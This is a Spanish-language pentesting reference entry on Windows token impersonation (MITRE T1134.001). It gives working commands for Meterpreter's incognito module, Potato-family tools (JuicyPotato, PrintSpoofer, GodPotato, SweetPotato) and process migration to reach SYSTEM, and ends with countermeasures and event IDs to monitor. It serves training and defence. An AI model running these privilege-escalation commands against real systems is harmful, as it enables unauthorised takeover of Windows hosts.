---
title: Token Impersonation (Suplantación de Tokens)
slug: token-impersonation
aliases: [Token Impersonation (Suplantación de Tokens)]
fase: [Post-Explotación]
plataforma: Windows
dificultad: Intermedia
mitre: [T1134.001]
related: []
learning_refs: []
---

# Token Impersonation (Suplantación de Tokens)

## Descripción
En Windows, cada proceso y hilo de ejecución tiene asociado un access token que define su contexto de seguridad (identidad, privilegios, grupo). La suplantación de tokens (token impersonation) permite a un atacante con acceso a una sesión comprometida robar o duplicar el token de seguridad de otro usuario (típicamente un administrador o SYSTEM) para ejecutar acciones con sus privilegios. Existen dos tipos de tokens: delegation tokens (creados al iniciar sesión interactivamente) e impersonation tokens (creados al acceder a recursos de red). Un atacante con privilegios `SeImpersonatePrivilege` o `SeAssignPrimaryTokenPrivilege` puede explotar esta técnica para escalar a SYSTEM.

## Herramientas
- **Incognito** (módulo de Metasploit) — enumeración y suplantación de tokens en sesiones Meterpreter
- **Mimikatz** (`token::elevate`, `token::run`) — manipulación directa de tokens de Windows
- **Kiwi** (módulo de Metasploit) — integración de Mimikatz en Meterpreter
- **Potato family** (JuicyPotato, PrintSpoofer, GodPotato, SweetPotato) — explotan `SeImpersonatePrivilege` para obtener SYSTEM
- **RoguePotato** / **SharpEfsPotato** — variantes actualizadas para versiones modernas de Windows

## Comandos / Ejemplos

### Enumeración y suplantación con Incognito (Meterpreter)
```
meterpreter > load incognito

# Listar tokens de delegación disponibles
meterpreter > list_tokens -u
# Resultado:
# Delegation Tokens Available
# ========================================
# ATTACKDEFENSE\Administrator
# NT AUTHORITY\SYSTEM

# Suplantar token de administrador
meterpreter > impersonate_token "ATTACKDEFENSE\\Administrator"
# [+] Delegation token available
# [+] Successfully impersonated user ATTACKDEFENSE\Administrator

# Verificar identidad actual
meterpreter > getuid
# Server username: ATTACKDEFENSE\Administrator

# Revertir al token original
meterpreter > rev2self
```

### Potato attacks — SeImpersonatePrivilege
```bash
# Verificar privilegios actuales (buscar SeImpersonatePrivilege)
whoami /priv

# JuicyPotato (Windows Server 2016/2019, Windows 10 < 1809)
JuicyPotato.exe -l 1337 -p c:\windows\system32\cmd.exe -a "/c whoami" -t *

# PrintSpoofer (Windows 10 y Server 2016/2019)
PrintSpoofer.exe -i -c cmd
# Resultado: shell como NT AUTHORITY\SYSTEM

# GodPotato (Windows Server 2012-2022, Windows 8-11)
GodPotato.exe -cmd "cmd /c whoami"
# Resultado: NT AUTHORITY\SYSTEM

# SweetPotato (alternativa multipropósito)
SweetPotato.exe -e EfsRpc -p cmd.exe
```

### Migración de proceso para obtener token SYSTEM
```
# Desde Meterpreter, migrar a un proceso que corra como SYSTEM
meterpreter > ps
# Buscar procesos como NT AUTHORITY\SYSTEM (ej: lsass.exe, services.exe)

meterpreter > migrate <PID_SYSTEM>
# [*] Migrating from 1234 to 5678...
# [*] Migration completed successfully.

meterpreter > getuid
# Server username: NT AUTHORITY\SYSTEM
```

### Creación de proceso con token robado (Windows API)
```powershell
# Con privilegios adecuados, duplicar token de otro proceso
# Usar herramientas como RunasCs o tokenx
RunasCs.exe administrator "Password123" cmd.exe
```

## Contramedidas
- Revocar `SeImpersonatePrivilege` y `SeAssignPrimaryTokenPrivilege` de cuentas de servicio que no lo necesiten
- Aplicar el principio de mínimo privilegio: las cuentas de servicio web (IIS, Apache) no deben tener privilegios de impersonación
- Usar cuentas de servicio administradas por grupo (gMSA) en lugar de cuentas locales
- Habilitar Credential Guard para proteger tokens LSASS en memoria
- Monitorear eventos de seguridad: Event ID 4624 (Logon) con tipo de logon 9 (NewCredentials) y Event ID 4672 (privilegios especiales asignados)
- Mantener Windows actualizado para mitigar nuevas variantes de Potato attacks

## Referencias
- MITRE Corporation. (2024). ATT&CK Technique T1134.001: Access Token Manipulation: Token Impersonation/Theft. https://attack.mitre.org/techniques/T1134/001/
- Kim, P. (2018). *The Hacker Playbook 3*. Secure Planet, LLC.
- Harper, A., Linn, R., Sims, S., & Baucom, M. (2018). *Gray Hat Hacking* (5th ed.). McGraw-Hill Education.
- Rahalkar, S. (2017). *Metasploit for Beginners*. Packt Publishing.
